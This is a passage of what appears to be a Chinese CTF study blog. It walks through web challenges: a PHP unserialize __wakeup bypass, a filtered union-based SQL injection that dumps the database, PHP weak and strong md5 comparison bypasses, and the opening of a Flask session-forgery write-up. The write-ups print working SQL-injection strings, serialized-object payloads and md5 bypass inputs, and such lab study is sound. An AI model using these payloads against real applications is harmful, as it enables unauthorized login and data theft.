$res=unserialize(@$select);   <span class="hljs-comment">//①  res为对象</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>反序列化：new创造对象时触发construct构造函数，unserialize时触发wakeup，结束后触发destruct析构函数</p>
<p>class.php:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;
    <span class="hljs-keyword">private</span> $username = <span class="hljs-string">&#x27;nonono&#x27;</span>;
    <span class="hljs-keyword">private</span> $password = <span class="hljs-string">&#x27;yesyes&#x27;</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$username,$password</span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;username = $username;
        <span class="hljs-keyword">$this</span>-&gt;password = $password;
    &#125;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-comment">//②</span>
        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;
    &#125;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;   <span class="hljs-comment">//③</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;  <span class="hljs-comment">//绕过这里</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;
            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;
            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;
            <span class="hljs-keyword">die</span>();
        &#125;
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;   <span class="hljs-comment">//关键点  ④</span>
            <span class="hljs-keyword">global</span> $flag;  <span class="hljs-comment">//可以变量覆盖</span>
            <span class="hljs-keyword">echo</span> $flag;
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;
            <span class="hljs-keyword">die</span>();
        &#125;
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>关键：</p>
<pre><code class="hljs elixir">不满足<span class="hljs-variable">$this</span>-&gt;password != <span class="hljs-number">100</span>
满足<span class="hljs-variable">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>
但是第②步的时候username被初始化变为了guest</code></pre>
<p><strong>问题就来了，在反序列化的时候会首先执行</strong><code>__wakeup()</code><strong>魔术方法，但是这个方法会把我们的username重新赋值，所以我们要考虑的就是怎么跳过</strong><code>__wakeup()</code><strong>，而去执行</strong><code>__destruct</code>——==属性个数的值大于实际属性个数时，会跳过
__wakeup()函数的执行==</p>
<p>构造序列化：最完整：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;
    <span class="hljs-keyword">private</span> $username = <span class="hljs-string">&#x27;nonono&#x27;</span>;
    <span class="hljs-keyword">private</span> $password = <span class="hljs-string">&#x27;yesyes&#x27;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$username,$password</span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;username = $username;
        <span class="hljs-keyword">$this</span>-&gt;password = $password;
    &#125;
&#125;
$a = <span class="hljs-keyword">new</span> Name(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-number">100</span>);
var_dump(serialize($a));
<span class="hljs-meta">?&gt;</span></code></pre>
<p>private版执行结果</p>
<pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;
修改属性个数：
<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;</code></pre>
<p>简洁:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;
	<span class="hljs-keyword">public</span> $username=<span class="hljs-string">&#x27;admin&#x27;</span>;
	<span class="hljs-keyword">public</span> $password= <span class="hljs-number">100</span>;
&#125; 
$flag = <span class="hljs-keyword">new</span> Name();
$flag_1 = serialize($flag);
<span class="hljs-keyword">echo</span> $flag_1;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>简洁版执行结果：</p>
<pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;
修改属性个数：
<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;</code></pre>
<p>但还是不行/???</p>
<h4 id="private">private</h4>
<p>private
声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见</p>
<p><strong>private属性被序列化后属性值会变成<code>%00类名%00属性名</code>,则需在创造对象后根据规则进行修改，长度也要加上%00</strong></p>
<p>payload1：</p>
<pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00username&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00password&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220217220200027.png" srcset="/img/loading.gif" alt="image-20220217220200027"></p>
<p>==<strong>注意❗⚠：可以进行url编码，防止%00对应的不可打印字符在复制时丢失</strong>==，payload2：</p>
<pre><code class="hljs php"><span class="hljs-comment">#未编码直接序列化private：</span>
<span class="hljs-comment">//O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;  //无法成功</span>
<span class="hljs-keyword">echo</span> urlencode(serialize($a));
<span class="hljs-comment">#编码后：可以成功得到flag</span>
O%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>admin%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A100%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D
<span class="hljs-comment">#再将Name后面的2换成3或其他值即可</span></code></pre>
<h2 id="极客大挑战-2019babysql">[极客大挑战 2019]BabySQL</h2>
<h4 id="考点关键词替换为空后回显部分数据">考点：关键词替换为空后回显部分数据</h4>
<h4 id="万能密码位置">万能密码，位置？</h4>
<blockquote>
<p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。</p>
<p>要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or
‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’
or true，所以返回值就是true。</p>
<p>当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。
当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or
1，那么返回值也是true。（xxx指代任意字符）</p>
<p><strong>只要'or'后面的字符串为一个非零的数字开头都会返回True</strong></p>
<pre><code class="hljs awk">select * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;1abcdefg&#x27;</span>    ---&gt;  True
select * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;0abcdefg&#x27;</span>    ---&gt;  False
select * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;1&#x27;</span>           ---&gt;  True
select * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;2&#x27;</span>           ---&gt;  True
select * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;0&#x27;</span>           ---&gt;  False</code></pre>
</blockquote>
<p>用户名输入admin,密码栏输入万能密码<code>amin'or'1</code>，发现不对，NO,Wrong
username
password！！！【==<strong>后续发现这里就可以猜出是replace了关键字，不然不可能回显密码错误，而应该爆出账号密码</strong>==】</p>
<p>密码输入<code>admin'</code>，回显error，密码输入<code>amin'#</code>，回显NO,Wrong
username password！！！，说明密码这存在字符注入</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220218143127168.png" srcset="/img/loading.gif" alt="image-20220218143127168" style="zoom:67%;"></p>
<p>用户名输入<code>1′ or 1=1 or '1'='1</code>，密码admin，回显Error，说明用户名出存在字符注入</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220218142842677.png" srcset="/img/loading.gif" alt="image-20220218142842677"></p>
<p>但是这个回显为什么只回显一部分?不懂，搜wp猜测是删掉了关键词</p>
<p>比如password输入or，回显没输入password，说明删掉了（过滤）关键词or，<code>oror</code>，也不行，<code>oorr</code>可以绕过，印证猜测，就是把关键词换位空</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220220222121231.png" srcset="/img/loading.gif" alt="image-20220220222121231" style="zoom: 50%;"></p>
<p>然后重新输入万能密码，发现成功登录</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220221001708538.png" srcset="/img/loading.gif" alt="image-20220221001708538" style="zoom:50%;"></p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">check</span>.php?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27; oorr &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span></code></pre>
<ol type="1">
<li><p>猜测列数，order和by都被过滤==》双写</p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">check</span>.php?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;oorrder bbyy 4 --+  //报错Unknown column &#x27;</span><span class="hljs-number">4</span><span class="hljs-string">&#x27; in &#x27;</span><span class="hljs-keyword">order</span> claus<span class="hljs-string">e&#x27;</span>
<span class="hljs-string">check.php?username=admin&amp;password=1&#x27;</span>oorrder bbyy <span class="hljs-number">3</span><span class="hljs-comment">--+  //NO,Wrong username password！！！说明有3列</span></code></pre></li>
<li><p>猜测位置，同理，只输入union select 1,2,3，报错version for the
right syntax to use near '1,2,3-- '' at line 1，说明<span style="background:#FF9999;">吞了</span>union和select，同样用双写绕过</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220220233828652.png" srcset="/img/loading.gif" alt="image-20220220233828652" style="zoom:67%;"></p>
<pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>--+  //发现回显位置<span class="hljs-number">2</span>,<span class="hljs-number">3</span></code></pre>
<ol start="3" type="1">
<li><p>爆数据库名：geek</p>
<pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>--+</code></pre></li>
<li><p>爆所有库：Your password is
'information_schema,mysql,performance_schema,test,ctf,geek'
//可疑库：ctf</p>
<pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) ffromrom infoorrmation_schema.schemata--+  // use near &#x27;.schemata,<span class="hljs-number">3</span>-- &#x27;&#x27; at line <span class="hljs-number">1</span></code></pre>
<p><strong>注意❗information.schema被过滤可能因为information里的or，而不是整个information被过滤</strong></p></li>
</ol></li>
</ol>
<h4 id="如何测试那些关键词被过滤用什么代替">如何测试那些关键词被过滤？用什么代替？</h4>
<p>先在password单独测试关键词，例如password输入from，回显Input your
username and password，说明被吞==》输入ffromrom，回显NO,Wrong username
password！！！，成功绕过 ==》<strong><span style="background:#FF9999;">先测试关键词+绕过方法再注入，不然不知道是哪个词出现了问题</span></strong></p>
<p>或者知道几列后，在某个位置用''直接回显，看他是不是自己，印证猜想：replace关键词为空</p>
<pre><code class="hljs ada"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;uunionnion</span> sselectelect <span class="hljs-number">1</span>,<span class="hljs-symbol">&#x27;information</span>&#x27;,<span class="hljs-number">3</span><span class="hljs-comment">--+</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220220235721090.png" srcset="/img/loading.gif" alt="image-20220220235721090" style="zoom:67%;"></p>
<ol start="5" type="1">
<li><p>爆表名：'b4bsql,geekuser'</p>
<pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) ffromrom infoorrmation_schema.tables wwherehere table_schema=database()--+</code></pre></li>
<li><p>爆列名：'id,username,password'</p>
<pre><code class="hljs ada"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;uunionnion</span> sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) ffromrom infoorrmation_schema.columns wwherehere table_name=<span class="hljs-symbol">&#x27;b4bsql</span>&#x27;<span class="hljs-comment">--+   //注意❗要加引号</span></code></pre></li>
<li><p>爆具体数据</p>
<pre><code class="hljs reasonml"><span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group<span class="hljs-constructor">_concat(<span class="hljs-params">concat_ws</span>(&#x27;--&#x27;,<span class="hljs-params">id</span>,<span class="hljs-params">username</span>,<span class="hljs-params">passwoorrd</span>)</span>) ffromrom b4bsql--+</code></pre>
<p>'1--cl4y--i_want_to_play_2077,2--sql--sql_injection_is_so_fun,3--porn--do_you_know_pornhub,4--git--github_is_different_from_pornhub,5--Stop--you_found_flag_so_stop,6--badguy--i_told_you_to_stop,7--hacker--hack_by_cl4y,8--flag--flag{4a2ddb62-9290-4b79-bce5-c2222e134275}'</p></li>
</ol>
<p>得到flag</p>
<h2 id="actf2020-新生赛backupfile简单">[ACTF2020
新生赛]BackupFile(简单)</h2>
<h4 id="考点备份文件弱类型比较数字相等">考点：备份文件、弱类型比较：数字相等</h4>
<p>御剑扫到index.php.bak，得到源码</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220221234847834.png" srcset="/img/loading.gif" alt="image-20220221234847834" style="zoom: 67%;"></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;
    $key = $_GET[<span class="hljs-string">&#x27;key&#x27;</span>];
    <span class="hljs-keyword">if</span>(!is_numeric($key)) &#123;  <span class="hljs-comment">//key得是数字</span>
        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);
    &#125;
    $key = intval($key);
    $str = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;
    <span class="hljs-keyword">if</span>($key == $str) &#123;   <span class="hljs-comment">//弱类型比较</span>
        <span class="hljs-keyword">echo</span> $flag;
    &#125;
&#125;
<span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source file!&quot;</span>;
&#125;</code></pre>
<p><strong>弱比较：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。所以直接传入key=123就行</strong></p>
<p>弱类型比较跟123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3相等即可==》数字，123</p>
<h2 id="bjdctf2020easy-md5">[BJDCTF2020]Easy MD5</h2>
<h4 id="考点md5弱类型强类型都考了f12网络抓包看hint">考点：md5弱类型+强类型都考了、F12网络抓包看hint</h4>
<p>一开始找不到要干啥，找WP发现，输入1，F12查看网络，得到提示/burp抓包也能看到，Hint:
select * from 'admin' where password=md5($pass,true)</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222000509201.png" srcset="/img/loading.gif" alt="image-20220222000509201" style="zoom:67%;"></p>
<p><strong><em>md5(string,raw):可选。规定十六进制或二进制输出格式：TRUE
- 原始 16 字符二进制格式，FALSE - 默认。32
字符十六进制数</em></strong></p>
<p>万能密码：</p>
<pre><code class="hljs angelscript"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or&#x27;</span><span class="hljs-number">1</span></code></pre>
<p>得找到某个东西使它md5 二进制后为万能密码，，看WP</p>
<ol type="1">
<li>ffifdyop，md5 二进制后是<code>'or'6�]��!r,��b</code></li>
</ol>
<blockquote>
<p>这里提供一个==<strong>最常用的：ffifdyop</strong>==，该字符串md5加密后若raw参数为True时会返回<code>'or'6&lt;trash&gt;</code>
(<code>&lt;trash&gt;</code>其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的<code>&lt;trash&gt;</code>会在MySQL将其转换成整型比较时丢掉)</p>
</blockquote>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222001300948.png" srcset="/img/loading.gif" alt="image-20220222001300948"></p>
<ol start="2" type="1">
<li>输入后跳转到/levels91.php</li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222001617105.png" srcset="/img/loading.gif" alt="image-20220222001617105" style="zoom:67%;"></p>
<p>查看源码得到php</p>
<pre><code class="hljs php">&lt;!--
$a = $GET[<span class="hljs-string">&#x27;a&#x27;</span>];
$b = $_GET[<span class="hljs-string">&#x27;b&#x27;</span>];
<span class="hljs-keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;
    <span class="hljs-comment">// wow, glzjin wants a girl friend.</span>
--&gt;</code></pre>
<p><strong>典型的md5碰撞，</strong>要求ab不同但md5相同，弱类型比较，<strong>弱类型比较
可以通过两个0e开头的md5绕过</strong></p>
<p><strong>这里提供一些md5以后是0e开头的值：</strong>【更多参考<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c5b05c766906">wp</a>】</p>
<pre><code class="hljs angelscript">QNKCDZO
<span class="hljs-number">0e830400451993494058024219903391</span>

s878926199a
<span class="hljs-number">0e545993274517709034328855841020</span>

s155964671a
<span class="hljs-number">0e342768416822451524974117254469</span>

s214587387a
<span class="hljs-number">0e848240448830537924465865611904</span>

s214587387a
<span class="hljs-number">0e848240448830537924465865611904</span></code></pre>
<p>构造levels91.php?a=QNKCDZO&amp;b=s878926199a，发现又跳转到新的页面levell14.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;

highlight_file(<span class="hljs-keyword">__FILE__</span>);

<span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">&#x27;param1&#x27;</span>]!==$_POST[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_POST[<span class="hljs-string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;
    <span class="hljs-keyword">echo</span> $flag;
&#125;</code></pre>
<p>强类型比较，需要1.强碰撞：<strong>找到两个md5值相同的字符串即可</strong>/2.绕过：<strong>数组绕过</strong></p>
<pre><code class="hljs php">md5(<span class="hljs-keyword">array</span>()) = <span class="hljs-literal">null</span>

<span class="hljs-comment">//更多：</span>
sha1(<span class="hljs-keyword">array</span>()) = <span class="hljs-literal">null</span>    
ereg(pattern,<span class="hljs-keyword">array</span>()) = <span class="hljs-literal">null</span> vs preg_match(pattern,<span class="hljs-keyword">array</span>) = <span class="hljs-literal">false</span>
strcmp(<span class="hljs-keyword">array</span>(), <span class="hljs-string">&quot;abc&quot;</span>) = <span class="hljs-literal">null</span>
strpos(<span class="hljs-keyword">array</span>(),<span class="hljs-string">&quot;abc&quot;</span>) = <span class="hljs-literal">null</span></code></pre>
<p>payload：</p>
<pre><code class="hljs apache"><span class="hljs-attribute">param1</span>[]=&amp;param<span class="hljs-number">2</span>[]=<span class="hljs-number">2</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222002727828.png" srcset="/img/loading.gif" alt="image-20220222002727828" style="zoom: 67%;"></p>
<h4 id="如何找到特定开头的md5值">如何找到特定开头的md5值？</h4>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/12535534.html">**大佬博客</a></p>
</blockquote>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>;;) &#123; 
 <span class="hljs-keyword">for</span> ($c = <span class="hljs-number">0</span>; $c &lt; <span class="hljs-number">1000000</span>; $c++, $i++)
  <span class="hljs-keyword">if</span> (stripos(md5($i, <span class="hljs-literal">true</span>), <span class="hljs-string">&#x27;\&#x27;or\&#x27;&#x27;</span>) !== <span class="hljs-literal">false</span>)
   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\nmd5(<span class="hljs-subst">$i</span>) = &quot;</span> . md5($i, <span class="hljs-literal">true</span>) . <span class="hljs-string">&quot;\n&quot;</span>;
 <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;.&quot;</span>;
&#125;
<span class="hljs-meta">?&gt;</span>

<span class="hljs-comment">//引用于 http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</span></code></pre>
<h2 id="hctf-2018admin">[HCTF 2018]admin(**)</h2>
<h4 id="考点flask客户端session伪造">考点:flask、客户端session伪造</h4>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44677409/article/details/100733581">csdn三种解法WP</a></p>
<p>更多：<a target="_blank" rel="noopener" href="https://inhann.top/2021/02/25/flask_newer/">flask漏洞利用小结</a></p>
<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679"><strong>详细，易懂，适合小白+CTF各种过滤绕过姿势</strong></a></p>
</blockquote>
<h4 id="flask">Flask</h4>
<p>==Flask==：一个用Python编写的轻量级Web应用框架。基于Werkzeug
WSGI工具箱和Jinja2模板引擎。</p>
<p>参考：https://www.jianshu.com/p/d537d634df7b</p>
<p>​ 总结一下，Flask处理一个请求的流程就是，首先根据 URL
决定由那个函数来处理，然后在函数中进行操作，取得所需的数据。再将数据传给相应的模板文件中，由Jinja2
负责渲染得到 HTTP 响应内容，然后由Flask返回响应内容。</p>
<ul>
<li><p>注意</p>
<p>render_template()是用来渲染一个指定的文件的。使用如下：return
render_template('index.html')
render_template_string则是用来渲染一个字符串的。<strong>SSTI与这个方法密不可分</strong>。</p></li>
</ul>
<p>​
<strong>简单来说也就是不正确的使用flask中的render_template_string方法会引发SSTI。</strong></p>
<ol type="1">
<li><strong>根据题目提示的admin,猜测是不是要让我用admin来登录这个网站？然后我在login界面输入用户名”admin“,密码”123“（弱口令）结果成功登录得到flag</strong></li>
<li>常规做法：先注册用户，登录用户后在修改密码查看源码，发现提示flask==&gt;框架，从GitHub上down源码</li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220223143114609.png" srcset="/img/loading.gif" alt="image-20220223143114609"></p>
<ol start="3" type="1">
<li><p>看到源码尝试模板注入，注册用户时regester.html有双大括号</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304184440886.png" srcset="/img/loading.gif" alt="image-20220304184440886" style="zoom: 67%;"></p>
<p>发现不行，并不响应</p></li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304184231019.png" srcset="/img/loading.gif" alt="image-20220304184231019" style="zoom:50%;"></p>
<p>而所有的传参form都经过了NewpasswordForm，转到定义，看不出来啥，猜测是被过滤了==》后续查看模板注入，发现<strong>只有render_template_string会导致注入</strong>，而且模板文件若已有<code>{{}}`,则无法产生注入，而模板语言无`{{}}</code>，输入参数可以<code>{{}}`的话就可以，参考https://xz.aliyun.com/t/3679

> **两种代码的形式是，一种当字符串来渲染并且使用了%(request.url)【参数可控】，另一种规范使用index.html渲染文件。我们漏洞代码使用了render_template_string函数，而如果使用render_template函数，将url里写自己想要的恶意代码`{{}}</code>传入进去并不会执行【良好的代码规范，使得模板其实已经固定了，已经被render_template渲染了，参数已经不可控】**</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304185102492.png" srcset="/img/loading.gif" alt="image-20220304185102492" style="zoom:67%;"></p>
<ol start="3" type="1">
<li>查看源码，在index.html得到flag的相关信息</li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220223145017072.png" srcset="/img/loading.gif" alt="image-20220223145017072" style="zoom: 50%;"></p>
<p>要求current_user.is_authenticated and session['name'] == 'admin'</p>
<h4 id="flask_session伪造">flask_session伪造</h4>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/client-session-security.html#">客户端
session 导致的安全问题、flask</a></p>
<p><a target="_blank" rel="noopener" href="https://chenlvtang.top/2021/02/01/Flask%E5%AE%A2%E6%88%B7%E7%AB%AFsession%E4%BC%AA%E9%80%A0/">Flask客户端session伪造</a></p>
